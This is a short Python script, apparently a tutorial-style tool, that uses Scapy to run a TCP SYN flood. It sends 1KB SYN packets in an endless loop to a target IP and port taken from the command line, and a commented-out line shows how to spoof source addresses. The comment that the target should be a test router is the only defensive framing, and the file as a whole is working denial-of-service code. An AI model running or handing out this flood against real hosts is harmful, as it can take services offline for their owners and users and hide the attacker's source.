from scapy.all import IP, TCP, Raw, RandShort, send
import sys
sys.dont_write_bytecode = True
# target IP address (should be a testing router/firewall)
target_ip = sys.argv[1]
# the target port u want to flood
target_port = sys.argv[2]
# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)
# or if you want to perform IP Spoofing (will work as well)
# ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
# add some flooding data (1KB in this case, don't increase it too much, 
# otherwise, it won't work.)
raw = Raw(b"X"*1024)
# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
print(f"Flooding {target_ip} on port {target_port} with TCP SYN packets!", flush=True)
send(p, loop=1, verbose=0)